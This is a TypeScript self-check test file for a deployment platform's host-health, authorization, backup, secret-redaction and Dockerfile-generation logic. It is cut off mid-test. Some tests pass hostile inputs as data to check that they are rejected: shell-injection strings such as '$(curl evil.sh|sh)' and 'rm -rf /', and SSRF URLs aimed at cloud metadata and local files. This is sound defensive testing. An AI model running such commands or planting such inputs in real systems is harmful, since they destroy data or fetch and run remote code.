/**
 * ponytail: ONE runnable self-check for the host-health logic that's easy to
 * get subtly wrong — deploy-cause mapping, Traefik log parsing, the dockerode
 * multiplexed-stream demux (the □-tofu root cause), and the ANSI sanitizer.
 * No framework: plain node:assert, run via `tsx` (already a devDep for seed).
 *
 *   bunx tsx scripts/selfcheck-host-health.ts
 *
 * The Traefik lines below are the REAL lines from the 2026-07-28 outage dump
 * (sanitized form, as the live scanner sees them), so this guards the parsers
 * against the exact shapes that caused the incident.
 */
import assert from "node:assert/strict"
import {
  diagnoseDeployError,
  parseTraefikLogs,
  demuxStream,
  sanitize,
} from "../src/lib/host-health"
import { roleAllows, defaultActionFor } from "../src/lib/authz"
import {
  backupSlug,
  shq,
  parseSizeMarker,
  dumpCommandFor,
  backupExtension,
} from "../src/lib/backup-format"
import { redactSecretValue, normalizeCommitSha, redactSecretUrl, REDACTED } from "../src/lib/sanitize-fields"
import {
  normalizeGitSource,
  detectStackFromFiles,
  refineNodeStack,
  findDockerfile,
  generateDockerfile,
  parseExposePort,
} from "../src/lib/git-deploy"
import {
  validIp,
  isPrivateIp,
  validateWebhookUrl,
  scrub,
  REDACTED as SEC_REDACTED,
  encryptSecret,
  decryptSecret,
  tokenDigest,
  mintToken,
  hasShellMetachars,
  execFormArgv,
  shellQuote,
} from "../src/lib/security"
import { deriveCertStatus, reachabilityFromProbe } from "../src/lib/status"
import { flagsFromEnv } from "../src/lib/feature-flags"
import { detectStackDetailed, stackAutofill } from "../src/lib/stack-detect"
import {
  classifyChangedFiles,
  classifyPushChanges,
  routeServicesByChanges,
  shouldSkipMonorepoRebuild,
  unionCommitFiles,
} from "../src/lib/changed-files"
import {
  buildDeploySnapshot,
  parseSnapshot,
  serializeSnapshot,
  snapshotForApi,
} from "../src/lib/deploy-snapshot"
import {
  domainStatusAfterRoute,
  deriveRoutingAction,
  formatRouteWarning,
  serializeRouteWarnings,
  parseRouteWarnings,
} from "../src/lib/route-after-deploy"
import { renderDomainRouteYaml } from "../src/lib/routing"

let n = 0
const ok = (name: string) => console.log(`  ✓ ${name}`)
const check = (name: string, fn: () => void) => {
  fn()
  n++
  ok(name)
}

// ── diagnoseDeployError: every signature + the null fallback ────────────────
check("spawn docker ENOENT → no-docker-CLI cause", () => {
  const d = diagnoseDeployError("docker build -t slipway-helix-web:latest . failed: spawn docker ENOENT")
  assert.ok(d, "expected a diagnosis")
  assert.match(d.cause, /no `docker` CLI/)
  assert.match(d.action, /image source|docker CLI in PATH/)
})

check("No space left on device → disk-full cause", () => {
  const d = diagnoseDeployError("PANIC: could not write to file pg_logical/x.tmp: No space left on device")
  assert.ok(d && /Host disk is full/.test(d.cause))
})

check("context canceled → daemon cause", () => {
  const d = diagnoseDeployError('Get "http://docker.sock/containers/json": context canceled')
  assert.ok(d && /daemon was restarting/.test(d.cause))
})

check("401 / Authentication failed → private/stale-token cause", () => {
  const d = diagnoseDeployError("fatal: could not read Username: Authentication failed for repo (401)")
  assert.ok(d && /Clone failed/i.test(d.cause) && /private|token|stale/i.test(d.cause))
})

check("Remote branch not found → branch cause", () => {
  const d = diagnoseDeployError(
    "warning: Could not find remote branch main to clone.\nfatal: Remote branch main not found in upstream origin"
  )
  assert.ok(d && /branch/i.test(d.cause))
})

check("missing Dockerfile → dockerfile cause", () => {
  const d = diagnoseDeployError("failed to read dockerfile: open Dockerfile: no such file or directory")
  assert.ok(d && /Dockerfile/i.test(d.cause))
})

check("BuildKit --mount on legacy builder → buildkit cause", () => {
  const d = diagnoseDeployError(
    "DEPRECATED: The legacy builder is deprecated\nthe --mount option requires BuildKit"
  )
  assert.ok(d && /BuildKit/i.test(d.cause))
})
check("missing dynamic yml → routing-config cause", () => {
  const d = diagnoseDeployError("open app-foo-bar-abc.yml: no such file or directory")
  assert.ok(d && /Routing config/.test(d.cause))
})

check("unrelated error → null (no false mapping)", () => {
  assert.equal(diagnoseDeployError("something else entirely"), null)
})

// ── parseTraefikLogs: the four real issue classes from the dump ─────────────
check("config: field not found, node (JSON-wrapped) → key trimmed", () => {
  const line = `{"level":"error","error":"command traefik error: field not found, node: excludedRequestPaths","time":"2026-07-16T11:24:03Z","message":"Command error"}`
  const iss = parseTraefikLogs(line)
  assert.equal(iss.length, 1)
  assert.equal(iss[0].kind, "config")
  assert.match(iss[0].message, /"excludedRequestPaths"/) // no trailing quote/JSON garbage
})

check("middleware: referenced-but-undefined → name captured", () => {
  const line = `2026-07-19T10:58:12Z ERR error="middleware \"redirect-to-https@file\" does not exist" entryPointName=web routerName=syazwan-timesheet-85qrzs-5-web@docker`
  const iss = parseTraefikLogs(line)
  assert.equal(iss.length, 1)
  assert.equal(iss[0].kind, "middleware")
  assert.match(iss[0].message, /redirect-to-https@file/)
})

check("acme: Unable to obtain → domain from domains=[\"x\"], HTTP 403, Cloudflare hint", () => {
  const line = `2026-07-26T15:43:50Z ERR Unable to obtain ACME certificate for domains error="unable to generate a certificate for the domains [slipway.skysyaz.my]: error: one or more domains had a problem:\\n[slipway.skysyaz.my] invalid authorization: acme: error: 403 :: 2606:4700:3032::ac43:bc6f: Invalid response ... 404\\n" domains=["slipway.skysyaz.my"] providerName=letsencrypt.acme routerName=slipway@file rule=Host(\`slipway.skysyaz.my\`)`
  const iss = parseTraefikLogs(line)
  assert.equal(iss.length, 1)
  assert.equal(iss[0].kind, "acme")
  assert.equal(iss[0].domain, "slipway.skysyaz.my")
  assert.match(iss[0].message, /HTTP 403/)
  assert.match(iss[0].hint ?? "", /Cloudflare|DNS-01/)
})

check("acme: 'Cannot retrieve the ACME challenge for X' → domain captured", () => {
  const line = `2026-07-16T11:20:09Z ERR Cannot retrieve the ACME challenge for router2.skysyaz.my (token "test") providerName=acme`
  const iss = parseTraefikLogs(line)
  assert.equal(iss.length, 1)
  assert.equal(iss[0].kind, "acme")
  assert.equal(iss[0].domain, "router2.skysyaz.my")
})

check("watcher: missing app-<slug>-<id>.yml → slug + id parsed", () => {
  const line = `2026-07-28T07:27:25Z ERR Error occurred during watcher callback error="/etc/dokploy/traefik/dynamic/app-transmit-neural-application-kwh9vu.yml: error reading configuration file: ... - open /etc/dokploy/traefik/dynamic/app-transmit-neural-application-kwh9vu.yml: no such file or directory" providerName=file`
  const iss = parseTraefikLogs(line)
  assert.equal(iss.length, 1)
  assert.equal(iss[0].kind, "watcher")
  assert.equal(iss[0].appSlug, "transmit-neural-application")
  assert.match(iss[0].message, /app-transmit-neural-application-kwh9vu\.yml/)
})

check("parseTraefikLogs dedups repeated identical issues", () => {
  const line = `2026-07-16T11:24:03Z {"error":"command traefik error: field not found, node: excludedRequestPaths"}`
  const iss = parseTraefikLogs([line, line, line].join("\n"))
  // same key → one issue even though the line repeats
  assert.equal(iss.filter((i) => i.kind === "config").length, 1)
})

// ── demuxStream: the □-tofu root cause ──────────────────────────────────────
check("demux: multiplexed frame → payload only (no 8-byte header bytes)", () => {
  // docker multiplexed header = 8 bytes: [streamType:1][pad:3][len:4 BE], then payload
  const frame = Buffer.concat([Buffer.from([0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05]), Buffer.from("hello")])
  const out = demuxStream(frame)
  assert.equal(out, "hello", "demux must return only the payload, not the header")
})

check("demux: two frames concatenated → both payloads", () => {
  const f1 = Buffer.concat([Buffer.from([0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03]), Buffer.from("foo")])
  const f2 = Buffer.concat([Buffer.from([0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03]), Buffer.from("bar")])
  assert.equal(demuxStream(Buffer.concat([f1, f2])), "foobar")
})

check("demux: plain TTY buffer (no framing) → whole buffer is payload", () => {
  // a buffer shorter than 8 bytes can't be a frame → treated as plain text
  assert.equal(demuxStream(Buffer.from("hi")), "hi")
})

// ── sanitize: ANSI + control stripping, keep \t ─────────────────────────────
check("sanitize: strips CSI color + control, keeps text + \\t", () => {
  assert.equal(sanitize("\x1b[31mred\x1b[0m text\x00\x07"), "red text")
  assert.equal(sanitize("col1\tcol2\n"), "col1\tcol2\n")
  assert.equal(sanitize("\x1b]0;title\x07clean"), "clean") // OSC title stripped
})

// ── authz: API token scopes are enforced, not decorative ───────────────────
// Regression: `can()` existed but had zero callers, so every authenticated
// principal — including a scope:"read" API token — could delete projects, drop
// databases and mint admin tokens. These pin the policy the route() wrapper
// now applies to token-authenticated requests.
check("authz: read scope can read, but cannot deploy or administer", () => {
  assert.equal(roleAllows("read", "read"), true)
  assert.equal(roleAllows("read", "deploy"), false)
  assert.equal(roleAllows("read", "admin"), false)
})

check("authz: deploy scope can read + deploy, but not administer", () => {
  assert.equal(roleAllows("deploy", "read"), true)
  assert.equal(roleAllows("deploy", "deploy"), true)
  assert.equal(roleAllows("deploy", "admin"), false)
})

check("authz: admin scope can do everything", () => {
  for (const a of ["read", "deploy", "admin"] as const) {
    assert.equal(roleAllows("admin", a), true)
  }
})

check("authz: unknown role degrades to read-only, never to admin", () => {
  assert.equal(roleAllows("wat", "read"), true)
  assert.equal(roleAllows("wat", "deploy"), false)
  assert.equal(roleAllows("", "admin"), false)
})

check("authz: method defaults — reads are read, mutations are deploy", () => {
  assert.equal(defaultActionFor("GET"), "read")
  assert.equal(defaultActionFor("HEAD"), "read")
  assert.equal(defaultActionFor("POST"), "deploy")
  assert.equal(defaultActionFor("PATCH"), "deploy")
  assert.equal(defaultActionFor("PUT"), "deploy")
  assert.equal(defaultActionFor("DELETE"), "deploy")
  assert.equal(defaultActionFor("delete"), "deploy") // case-insensitive
})

// ── backup naming + dump commands ──────────────────────────────────────────
check("backupSlug: filesystem-safe, never empty", () => {
  assert.equal(backupSlug("My DB/Name"), "my-db-name")
  assert.equal(backupSlug("!!!"), "backup")
  assert.equal(backupSlug("keep.dots_and-dashes"), "keep.dots_and-dashes")
  // no path separators survive, so a crafted name can't escape /backups
  assert.ok(!backupSlug("../../etc/passwd").includes("/"))
})

check("shq: single-quotes values so a password can't break out of sh -c", () => {
  assert.equal(shq("simple"), "'simple'")
  assert.equal(shq("it's"), "'it'\\''s'")
  // The classic injection attempt must end up fully literal: after the opening
  // quote, every embedded quote is closed-escaped-reopened, so the shell never
  // sees an unquoted `;`.
  const evil = "a'; rm -rf /; echo '"
  const q = shq(evil)
  assert.ok(q.startsWith("'") && q.endsWith("'"))
  assert.ok(!/[^\\]'[^\\']/.test(q.slice(1, -1).replace(/'\\''/g, "")))
  for (const v of ["$(id)", "`id`", "a b; c", "'", "''", ""]) {
    const out = shq(v)
    assert.ok(out.startsWith("'") && out.endsWith("'"), `not quoted: ${out}`)
  }
})

check("parseSizeMarker: reads the LAST SIZE marker, tolerates noise", () => {
  assert.equal(parseSizeMarker("SIZE:12345"), 12345)
  assert.equal(parseSizeMarker("tar: warning\nSIZE:42\n"), 42)
  // a size printed by an earlier step must not win over the final one
  assert.equal(parseSizeMarker("SIZE:1\nmore\nSIZE:999"), 999)
  assert.equal(parseSizeMarker("no marker here"), null)
  assert.equal(parseSizeMarker(""), null)
})

check("backupExtension: rdb for key-value stores, sql.gz otherwise", () => {
  assert.equal(backupExtension("redis"), "rdb")
  assert.equal(backupExtension("valkey"), "rdb")
  assert.equal(backupExtension("postgres"), "sql.gz")
})

check("dumpCommandFor: every supported engine writes the target file", () => {
  const row = { username: "slipway", password: "p@ssw0rd", dbName: "app" }
  for (const kind of ["postgres", "mysql", "mariadb", "mongodb", "redis", "valkey"]) {
    const spec = dumpCommandFor(kind, row, "/backups/x.gz", 5432)
    assert.ok(spec, `${kind} must be dumpable`)
    assert.ok(spec!.cmd.includes("/backups/x.gz"), `${kind} must write the target file`)
    // the password travels in the environment, never on the command line —
    // otherwise it shows up in `ps` inside the helper container
    assert.ok(!spec!.cmd.includes("p@ssw0rd"), `${kind} leaked the password into argv`)
    assert.ok(
      spec!.env.some((e) => e.includes("p@ssw0rd")),
      `${kind} must pass the password via env`
    )
  }
})

check("dumpCommandFor: piped dumps enable pipefail so a failed dump isn't recorded as success", () => {
  const row = { username: "slipway", password: "p@ssw0rd", dbName: "app" }
  for (const kind of ["postgres", "mysql", "mariadb", "mongodb"]) {
    const spec = dumpCommandFor(kind, row, "/backups/x.gz", 5432)
    assert.ok(spec, `${kind} must be dumpable`)
    // Without pipefail, `false | gzip` exits 0 and produces a valid archive.
    assert.ok(
      /set\s+-o\s+pipefail/.test(spec!.cmd),
      `${kind} dump pipeline must set pipefail: ${spec!.cmd}`
    )
  }
  // redis/valkey write the rdb directly — no pipe, so pipefail is unnecessary
  for (const kind of ["redis", "valkey"]) {
    const spec = dumpCommandFor(kind, row, "/backups/x.rdb", 6379)
    assert.ok(spec)
    assert.ok(!spec!.cmd.includes("|"), `${kind} must not pipe through gzip`)
  }
})

check("dumpCommandFor: unsupported engines refuse instead of faking a dump", () => {
  const row = { username: "sa", password: "x", dbName: "d" }
  assert.equal(dumpCommandFor("mssql", row, "/backups/x", 1433), null)
  assert.equal(dumpCommandFor("sqlite", row, "/backups/x", 0), null)
  assert.equal(dumpCommandFor("nonsense", row, "/backups/x", 0), null)
})

// ── sanitize-fields: secrets never leave, SHAs are never invented ───────────
check("redactSecretValue: credential-ish keys are redacted, others pass through", () => {
  // the real leak: per-server SSH passwords live in Settings
  assert.equal(redactSecretValue("server:abc123:password", "hunter2"), REDACTED)
  assert.equal(redactSecretValue("GITHUB_TOKEN", "ghp_xxx"), REDACTED)
  assert.equal(redactSecretValue("registry.secret", "s3cret"), REDACTED)
  assert.equal(redactSecretValue("smtp.credential", "x"), REDACTED)
  assert.equal(redactSecretValue("api_key", "x"), REDACTED)
  assert.equal(redactSecretValue("private.pem", "x"), REDACTED)
  // non-secrets stay readable so the export is still useful
  assert.equal(redactSecretValue("cluster.id", "helix-eu"), "helix-eu")
  assert.equal(redactSecretValue("cluster.maintenance", "false"), "false")
})

check("redactSecretValue: matching is case-insensitive", () => {
  for (const k of ["PASSWORD", "Secret", "ApiKey", "TOKEN", "Private"]) {
    assert.equal(redactSecretValue(k, "leak"), REDACTED, `${k} must be redacted`)
  }
})

check("redactSecretValue: trailing .pass / :pass keys are redacted without false positives", () => {
  assert.equal(redactSecretValue("smtp.pass", "x"), REDACTED)
  assert.equal(redactSecretValue("server:1:pass", "x"), REDACTED)
  assert.equal(redactSecretValue("compass", "keep"), "keep")
  assert.equal(redactSecretValue("bypass", "keep"), "keep")
})

check("redactSecretUrl: strips userinfo, token query params, and webhook path secrets", () => {
  assert.equal(
    redactSecretUrl("https://user:secret@hooks.example/hooks/abc"),
    "https://redacted:redacted@hooks.example/hooks/[redacted]"
  )
  assert.ok(redactSecretUrl("https://discord.com/api/webhooks/123/tokensecret").includes(REDACTED))
  const withQuery = redactSecretUrl("https://example.com/hook?token=abc")
  assert.ok(!withQuery.includes("token=abc"), `token value leaked: ${withQuery}`)
  assert.ok(/token=/i.test(withQuery), `token param missing: ${withQuery}`)
  assert.equal(redactSecretUrl("not a url"), REDACTED)
})

check("normalizeCommitSha: keeps real object ids, discards everything else", () => {
  assert.equal(normalizeCommitSha("a3f9c21"), "a3f9c21") // short
  assert.equal(normalizeCommitSha("A3F9C21"), "a3f9c21") // normalised to lower
  assert.equal(normalizeCommitSha("da39a3ee5e6b4b0d3255bfef95601890afd80709"), "da39a3ee5e6b4b0d3255bfef95601890afd80709")
  assert.equal(normalizeCommitSha("  a3f9c21  "), "a3f9c21") // trimmed
})

check("normalizeCommitSha: returns empty rather than inventing a commit", () => {
  assert.equal(normalizeCommitSha(undefined), "")
  assert.equal(normalizeCommitSha(null), "")
  assert.equal(normalizeCommitSha(""), "")
  assert.equal(normalizeCommitSha("abc"), "") // too short to be an object id
  assert.equal(normalizeCommitSha("zzzzzzz"), "") // not hex
  assert.equal(normalizeCommitSha("main"), "")
  assert.equal(normalizeCommitSha("0".repeat(41)), "") // too long
})

// ── git-deploy: public repo URL normalisation + Dockerfile generation ───────
check("normalizeGitSource: accepts bare github.com/org/repo and https forms", () => {
  const a = normalizeGitSource("github.com/vercel/next.js", "canary")
  assert.ok(a)
  assert.equal(a!.cloneUrl, "https://github.com/vercel/next.js.git")
  assert.equal(a!.dockerGitUrl, "https://github.com/vercel/next.js.git#canary")
  assert.equal(a!.owner, "vercel")
  assert.equal(a!.repo, "next.js")
  assert.equal(a!.branch, "canary")

  const b = normalizeGitSource("https://github.com/org/repo.git")
  assert.equal(b!.cloneUrl, "https://github.com/org/repo.git")
  assert.equal(b!.branch, "main")

  const c = normalizeGitSource("git@github.com:org/repo.git", "develop")
  assert.equal(c!.cloneUrl, "https://github.com/org/repo.git")
  assert.equal(c!.branch, "develop")
})

check("normalizeGitSource: parses GitHub tree URLs into branch + subdir", () => {
  const g = normalizeGitSource("https://github.com/org/repo/tree/feat/apps/web")
  assert.ok(g)
  assert.equal(g!.branch, "feat")
  assert.equal(g!.subdir, "apps/web")
  assert.equal(g!.dockerGitUrl, "https://github.com/org/repo.git#feat:apps/web")
})

check("normalizeGitSource: rejects empty / non-http schemes", () => {
  assert.equal(normalizeGitSource(""), null)
  assert.equal(normalizeGitSource("ftp://github.com/org/repo"), null)
  assert.equal(normalizeGitSource("not a url !!!"), null)
})

check("detectStackFromFiles + refineNodeStack: Dockerfile wins, else package.json/next", () => {
  assert.equal(detectStackFromFiles(["Dockerfile", "package.json"]), "dockerfile")
  assert.equal(detectStackFromFiles(["package.json", "src"]), "node")
  assert.equal(detectStackFromFiles(["requirements.txt"]), "python")
  assert.equal(detectStackFromFiles(["index.html"]), "static")
  assert.equal(refineNodeStack('{"dependencies":{"next":"15.0.0"}}'), "nextjs")
  assert.equal(refineNodeStack('{"dependencies":{"express":"4.0.0"}}'), "node")
  assert.equal(findDockerfile(["readme.md", "Dockerfile"]), "Dockerfile")
  assert.equal(findDockerfile(["readme.md"]), null)
})

check("generateDockerfile: produces EXPOSE for node/next/static, refuses unknown", () => {
  const node = generateDockerfile({ stack: "node", startCmd: "node server.js" })
  // R5: CMD is exec-form argv JSON — ["node","server.js"], so shell metachars
  // are literal text, never interpreted. Assert the JSON form, not shell text.
  assert.ok(node && /EXPOSE 3000/.test(node) && /"node","server\.js"|"node",\s*"server\.js"/.test(node))
  const next = generateDockerfile({ stack: "nextjs" })
  assert.ok(next && /NEXT_TELEMETRY_DISABLED/.test(next))
  const stat = generateDockerfile({ stack: "static" })
  assert.ok(stat && /nginx/.test(stat))
  assert.equal(generateDockerfile({ stack: "unknown" }), null)
  assert.equal(generateDockerfile({ stack: "rust" }), null)
  assert.equal(parseExposePort("FROM x\nEXPOSE 8080\nCMD y"), 8080)
})

// R5: command injection — a build/start command carrying shell metacharacters
// must NOT be emitted as an executable shell line.
check("generateDockerfile: rejects shell-injection in build/start commands", () => {
  const evil = generateDockerfile({ stack: "node", startCmd: "node x.js; rm -rf /" })
  assert.equal(evil, null)
  const evil2 = generateDockerfile({ stack: "node", buildCmd: "$(curl evil.sh|sh)" })
  assert.equal(evil2, null)
  const evil3 = generateDockerfile({ stack: "node", startCmd: "node `whoami`.js" })
  assert.equal(evil3, null)
  // safe commands still generate, and any emitted CMD is exec-form (no sh -c).
  const ok = generateDockerfile({ stack: "node", startCmd: "node server.js" })
  assert.ok(ok)
  assert.ok(!/"sh",\s*"-c"/.test(ok), "CMD must be exec-form argv, not sh -c")
})

// ── security.ts helpers (R5/R6/R7) ──────────────────────────────────────────
check("validIp: octet-range checked (999.999.999.999 rejected), IPv4+IPv6", () => {
  assert.equal(validIp("999.999.999.999"), false)
  assert.equal(validIp("256.0.0.1"), false)
  assert.equal(validIp("104.214.169.39"), true)
  assert.equal(validIp("::1"), true)
  assert.equal(validIp("not-an-ip"), false)
})

check("isPrivateIp: loopback/private/link-local/metadata blocked, public allowed", () => {
  for (const p of ["127.0.0.1", "10.1.2.3", "172.16.5.4", "192.168.1.1", "169.254.169.254", "0.0.0.0", "::1"]) {
    assert.equal(isPrivateIp(p), true, `${p} must be private`)
  }
  assert.equal(isPrivateIp("104.214.169.39"), false)
})

check("validateWebhookUrl: blocks metadata/loopback/file/ftp, allows https", () => {
  assert.equal(validateWebhookUrl("http://169.254.169.254/latest/meta-data").ok, false)
  assert.equal(validateWebhookUrl("http://127.0.0.1:9000/hook").ok, false)
  assert.equal(validateWebhookUrl("http://10.0.0.5/x").ok, false)
  assert.equal(validateWebhookUrl("file:///etc/passwd").ok, false)
  assert.equal(validateWebhookUrl("ftp://evil/x").ok, false)
  assert.equal(validateWebhookUrl("gopher://x").ok, false)
  assert.equal(validateWebhookUrl("https://hooks.slack.com/services/T/B/x").ok, true)
  assert.equal(validateWebhookUrl("https://discord.com/api/webhooks/1/2").ok, true)
})

check("scrub: redacts registry auth, jwt, password fields by default", () => {
  const reg = [{ name: "ghcr", url: "ghcr.io", auth: "dXNlcjpwYXNzd29yZDEyMzQ1Njc4" }]
  const out = scrub(reg) as { auth: string }[]
  assert.equal(out[0].auth, SEC_REDACTED)
  const rec = (v: unknown) => scrub(v) as Record<string, unknown>
  assert.equal(rec({ jwt: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.sig" })["jwt"], SEC_REDACTED)
  assert.equal(rec({ url: "https://ok" })["url"], "https://ok")
})

check("encrypt/decrypt secret: round-trips, ciphertext never contains plaintext", () => {
  process.env.SLIPWAY_MASTER_KEY = "a".repeat(64)
  const pw = "sup3r-secret-db-password"
  const enc = encryptSecret(pw)
  assert.ok(enc.startsWith("v1:"))
  assert.ok(!enc.includes(pw), "ciphertext must not contain the plaintext")
  assert.equal(decryptSecret(enc), pw)
  delete process.env.SLIPWAY_MASTER_KEY
})

check("tokenDigest/mintToken: sha256 index, slipway_ prefix, no plaintext reuse", () => {
  const t = mintToken()
  assert.ok(t.startsWith("slipway_") && t.length > 20)
  const d = tokenDigest(t)
  assert.equal(d.length, 64)
  assert.notEqual(d, t)
})

check("hasShellMetachars + execFormArgv + shellQuote", () => {
  assert.equal(hasShellMetachars("node x.js; rm -rf /"), true)
  assert.equal(hasShellMetachars("$(curl x|sh)"), true)
  assert.equal(hasShellMetachars("node server.js"), false)
  assert.deepEqual(execFormArgv('nginx -g "daemon off;"'), ["nginx", "-g", "daemon off;"])
  assert.equal(shellQuote("it's"), "'it'\\''s'")
})

// ── status.ts derived model (META-RULE 2) ───────────────────────────────────
check("deriveCertStatus: IP mode is never 'Cert pending' and never ACME", () => {
  const https = deriveCertStatus({ hostname: "104.214.169.39", ssl: "managed", status: "pending", https: true, isIp: true })
  assert.equal(https.state, "self-signed")
  assert.equal(https.tone, "warn")
  const http = deriveCertStatus({ hostname: "104.214.169.39", ssl: "disabled", status: "active", https: false, isIp: true })
  assert.equal(http.state, "http")
})

check("deriveCertStatus: custom (self-signed) cert shows Self-signed, never pending", () => {
  const s = deriveCertStatus({ hostname: "app.example.com", ssl: "custom", status: "active", https: true })
  assert.equal(s.state, "self-signed")
  assert.equal(s.tone, "warn")
  assert.match(s.reason || "", /self-signed/i)
})

check("deriveCertStatus: pending -> stuck after timeout; active is HTTPS; http for plain", () => {
  const fresh = deriveCertStatus({ hostname: "app.example.com", ssl: "managed", status: "pending", https: true, createdAt: new Date(Date.now() - 60_000) })
  assert.equal(fresh.state, "pending")
  const old = deriveCertStatus({ hostname: "app.example.com", ssl: "managed", status: "pending", https: true, createdAt: new Date(Date.now() - 20 * 60 * 1000) })
  assert.equal(old.state, "stuck")
  assert.equal(old.tone, "warn")
  const active = deriveCertStatus({ hostname: "app.example.com", ssl: "managed", status: "active", https: true })
  assert.equal(active.state, "active")
  const plain = deriveCertStatus({ hostname: "app.example.com", ssl: "disabled", status: "active", https: false })
  assert.equal(plain.state, "http")
})

check("reachabilityFromProbe: reachable / 404 / tls / conn-fail mapped with hints", () => {
  assert.equal(reachabilityFromProbe({ ok: true, code: 200, latencyMs: 12 }).state, "reachable")
  const nf = reachabilityFromProbe({ ok: false, code: 404 })
  assert.equal(nf.state, "http-error")
  assert.match(nf.hint || "", /no route at '\//)
  const tls = reachabilityFromProbe({ ok: false, error: "self signed certificate" })
  assert.equal(tls.state, "tls-error")
  const down = reachabilityFromProbe({ ok: false, error: "fetch failed: ECONNREFUSED" })
  assert.equal(down.state, "connection-failed")
  assert.match(down.hint || "", /crash-looping|port/i)
})

// ── OpenShip port: feature flags / P1–P4 pure helpers ───────────────────────
check("feature flags: unset defaults ON; 0/false/off/no disable", () => {
  const on = flagsFromEnv({})
  assert.equal(on.routeAfterDeploy, true)
  assert.equal(on.deploySnapshot, true)
  assert.equal(on.stackDetect, true)
  assert.equal(on.smartMonorepo, true)
  const off = flagsFromEnv({
    SLIPWAY_FF_ROUTE_AFTER_DEPLOY: "0",
    SLIPWAY_FF_DEPLOY_SNAPSHOT: "false",
    SLIPWAY_FF_STACK_DETECT: "off",
    SLIPWAY_FF_SMART_MONOREPO: "no",
  })
  assert.equal(off.routeAfterDeploy, false)
  assert.equal(off.deploySnapshot, false)
  assert.equal(off.stackDetect, false)
  assert.equal(off.smartMonorepo, false)
})

check("detectStackDetailed: nextjs / fastapi / dockerfile / compose", () => {
  const next = detectStackDetailed({
    files: ["package.json", "next.config.js"],
    fileContents: {
      "package.json": JSON.stringify({
        dependencies: { next: "15.0.0", react: "19.0.0" },
        scripts: { build: "next build", start: "next start" },
      }),
    },
  })
  assert.equal(next.stack, "nextjs")
  assert.equal(next.framework, "nextjs")
  assert.match(next.buildCommand, /build/)
  const fill = stackAutofill(next)
  assert.equal(fill.port, 3000)

  const docker = detectStackDetailed({ files: ["Dockerfile", "package.json"] })
  assert.equal(docker.stack, "dockerfile")

  const compose = detectStackDetailed({ files: ["docker-compose.yml"] })
  assert.equal(compose.stack, "compose")

  const fa = detectStackDetailed({
    files: ["requirements.txt", "main.py"],
    fileContents: { "requirements.txt": "fastapi==0.115.0\nuvicorn\n" },
  })
  assert.equal(fa.stack, "python")
  assert.equal(fa.framework, "fastapi")
  assert.match(fa.startCommand, /uvicorn/)
})

check("domainStatusAfterRoute + deriveCertStatus action-required (P1)", () => {
  assert.equal(domainStatusAfterRoute({ routed: false, tlsMode: "letsencrypt" }), "action-required")
  assert.equal(domainStatusAfterRoute({ routed: true, tlsMode: "letsencrypt" }), "pending")
  assert.equal(domainStatusAfterRoute({ routed: true, tlsMode: "http" }), "active")
  const ar = deriveCertStatus({
    hostname: "app.example.com",
    ssl: "managed",
    status: "action-required",
    https: true,
  })
  assert.equal(ar.state, "action-required")
  assert.equal(ar.tone, "warn")
  assert.match(ar.reason || "", /App is up/i)
  const warn = formatRouteWarning("app.example.com", "ENOENT traefik dir")
  assert.match(warn, /^app\.example\.com:/)
  const ser = serializeRouteWarnings([warn])
  assert.deepEqual(parseRouteWarnings(ser), [warn])
  const chip = deriveRoutingAction({ status: "action-required", routeWarnings: [warn], hostname: "app.example.com" })
  assert.equal(chip.actionRequired, true)
})

check("buildDeploySnapshot freezes build/start and scrubs secrets for API (P3)", () => {
  process.env.NEXTAUTH_SECRET = process.env.NEXTAUTH_SECRET || "selfcheck-secret-for-snapshot-tests-32b"
  const snap = buildDeploySnapshot(
    {
      source: "git",
      repoUrl: "https://github.com/org/repo.git",
      stack: "nextjs",
      buildCmd: "npm run build",
      startCmd: "npm run start",
      environment: "production",
      envVars: [
        { key: "PUBLIC_URL", value: "https://x", scope: "all", masked: false },
        { key: "SECRET_TOKEN", value: "super-secret", scope: "production", masked: true },
      ],
    },
    { branch: "main", port: 3000 }
  )
  assert.equal(snap.version, 1)
  assert.equal(snap.buildCmd, "npm run build")
  assert.equal(snap.startCmd, "npm run start")
  assert.equal(snap.env?.PUBLIC_URL, "https://x")
  assert.ok(snap.env?.SECRET_TOKEN?.startsWith("v1:"))
  assert.ok(snap.encryptedEnvKeys?.includes("SECRET_TOKEN"))
  const raw = serializeSnapshot(snap)
  assert.equal(parseSnapshot(raw)?.branch, "main")
  const api = snapshotForApi(raw) as { env?: Record<string, string> }
  assert.equal(api.env?.SECRET_TOKEN, "[redacted]")
})

check("changed-files classifiers: root-config forceAll, monorepo skip, truncate (P4)", () => {
  assert.equal(classifyChangedFiles(["apps/web/page.tsx"]).forceAll, false)
  assert.equal(classifyChangedFiles(["package.json"]).forceAll, true)
  assert.equal(classifyChangedFiles(["package.json"]).reason, "root-config")
  const shared = classifyChangedFiles(["packages/ui/button.tsx"], {
    isMonorepo: true,
    monorepoSharedPaths: ["packages/"],
  })
  assert.equal(shared.forceAll, true)
  assert.equal(shared.reason, "shared-package")

  const routed = routeServicesByChanges(
    [
      { id: "web", rootDirectory: "apps/web" },
      { id: "api", rootDirectory: "apps/api" },
    ],
    ["apps/web/page.tsx"]
  )
  assert.equal(routed.mode, "services")
  if (routed.mode === "services") assert.deepEqual(routed.serviceIds, ["web"])

  const skip = shouldSkipMonorepoRebuild({
    monorepoPath: "apps/web",
    files: ["apps/api/main.go"],
  })
  assert.equal(skip.skip, true)
  const noskip = shouldSkipMonorepoRebuild({
    monorepoPath: "apps/web",
    files: ["apps/web/page.tsx"],
  })
  assert.equal(noskip.skip, false)

  const files = unionCommitFiles([
    { added: ["a.ts"], modified: ["b.ts"], removed: ["c.ts"] },
  ])
  assert.equal(files.size, 3)
  const truncated = classifyPushChanges({
    files: ["apps/web/x.ts"],
    truncated: true,
    isMonorepo: true,
  })
  assert.equal(truncated.forceAll, true)
  assert.equal(truncated.reason, "truncated")
  const forced = classifyPushChanges({
    files: [],
    forced: true,
  })
  assert.equal(forced.reason, "force-push")
  const token = classifyPushChanges({
    files: ["x"],
    headMessage: "fix: stuff [force-deploy]",
  })
  assert.equal(token.reason, "commit-token")
})

check("renderDomainRouteYaml: letsencrypt gets HTTP+HTTPS routers (P5 HTTP-01)", () => {
  const yml = renderDomainRouteYaml({
    projectSlug: "web",
    projectId: "projxxxxxx",
    hostname: "app.example.com",
